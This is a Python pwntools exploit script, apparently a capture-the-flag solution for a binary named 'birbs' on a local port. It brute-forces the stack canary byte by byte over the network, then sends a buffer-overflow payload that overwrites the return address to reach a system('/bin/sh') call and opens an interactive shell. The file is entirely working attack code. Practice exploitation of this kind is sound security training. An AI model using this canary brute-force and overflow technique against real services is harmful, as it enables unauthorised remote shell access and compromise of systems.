#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ../players/birbs
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('../players/birbs')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4040)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

canary = b''

# Brute force canary byte by byte
while len(canary) < 8:
    # Try all possibilities for each byte of the canary
    for i in range(256):
        io.recvuntil(b'Give up')
        io.sendline(b'1')
        io.recvuntil(b'9223372036854775807)\n')
        payload = b'a' * (0x28)
        payload += canary + i.to_bytes(1, 'little')
        io.send(payload)
        sleep(0.001)
        response = io.recvline()
        if b'again' in response:
            canary += i.to_bytes(1, 'little')
            info(canary.hex())
            break
        if i == 255:
            print("Can't find canary, exiting")
            exit()

# Now that we know what the canary is we can use the buffer overflow and jump to the system("/bin/sh") call
print(canary)
io.recvuntil(b'Give up.\n')
io.sendline(b'1')
io.recvuntil(b'9223372036854775807)\n')
payload += b'a' * 8
payload += p64(0x0040129e)
io.send(payload)
sleep(0.1)

io.interactive()

